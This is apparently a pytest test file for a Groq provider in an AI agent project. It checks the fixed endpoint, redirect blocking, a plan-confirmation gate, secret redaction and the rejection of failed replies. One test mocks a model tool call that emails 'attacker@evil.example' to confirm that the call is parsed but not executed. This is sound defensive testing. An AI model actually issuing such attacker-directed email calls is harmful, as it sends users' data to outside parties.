from types import SimpleNamespace
import pytest
from agent import groq_provider as groq, llm


def setup(monkeypatch,status=200,content='FINAL: done',finish='stop'):
    monkeypatch.setenv('GROQ_API_KEY','test-secret')
    monkeypatch.setenv('GROQ_FREE_PLAN_CONFIRMED','1')
    calls=[]
    def post(*a,**k):
        calls.append((a,k))
        return SimpleNamespace(status_code=status,json=lambda:{'choices':[{'finish_reason':finish,'message':{'content':content}}]})
    monkeypatch.setattr(groq.requests,'post',post)
    return calls


def complete():
    return groq.complete('prompt',system_instruction='system',model='openai/gpt-oss-20b',temperature=0,max_output_tokens=1024)


def test_groq_request_uses_fixed_endpoint_and_no_tools(monkeypatch):
    calls=setup(monkeypatch)
    assert complete()=='FINAL: done'
    args,kwargs=calls[0]
    assert args==(groq.ENDPOINT,)
    assert kwargs['allow_redirects'] is False
    assert kwargs['json']['reasoning_effort']=='low'
    assert kwargs['json']['messages'][0]['role']=='system'
    assert 'tools' not in kwargs['json']


@pytest.mark.parametrize('status,content,finish',[(429,'x','stop'),(503,'x','stop'),(200,None,'stop'),(200,'partial','length')])
def test_invalid_groq_outcomes_never_become_answers(monkeypatch,status,content,finish):
    calls=setup(monkeypatch,status,content,finish)
    with pytest.raises(RuntimeError):complete()
    assert len(calls)==1


def test_account_confirmation_required_before_network(monkeypatch):
    calls=setup(monkeypatch)
    monkeypatch.delenv('GROQ_FREE_PLAN_CONFIRMED')
    with pytest.raises(RuntimeError,match='free plan'):complete()
    assert not calls


def test_groq_routes_all_generate_calls_and_redacts(monkeypatch):
    setup(monkeypatch)
    monkeypatch.setattr(llm,'PROVIDER','groq')
    monkeypatch.setattr(llm._LIMITER,'acquire',lambda:None)
    assert llm.generate('test',model='openai/gpt-oss-20b')=='FINAL: done'
    def fail(*a,**k):raise RuntimeError('test-secret')
    monkeypatch.setattr(groq,'complete',fail)
    with pytest.raises(llm.LLMError,match=r'\[REDACTED\]'):llm.generate('test')


def test_native_tool_intent_is_converted_not_executed(monkeypatch):
    setup(monkeypatch)
    captured={}
    def post(*a,**k):
        captured.update(k['json'])
        return SimpleNamespace(status_code=200,json=lambda:{'choices':[{'finish_reason':'tool_calls','message':{
            'tool_calls':[{'function':{'name':'send_email','arguments':'{"to":"attacker@evil.example","subject":"test","body":"test"}'}}]}}]})
    monkeypatch.setattr(groq.requests,'post',post)
    text=groq.complete('test',system_instruction='You are MailBot, an assistant',model='openai/gpt-oss-20b',temperature=0,max_output_tokens=1024)
    from agent.agent import parse_response
    kind,payload=parse_response(text)
    assert kind=='action' and payload['tool']=='send_email'
    assert captured['parallel_tool_calls'] is False
    assert len(captured['tools'])==3
    # The transport only emits intent; no mock or real mail dispatch occurs here.
    with pytest.raises(RuntimeError,match='unexpected'):
        complete() # reviewer prompt must never accept tool calls
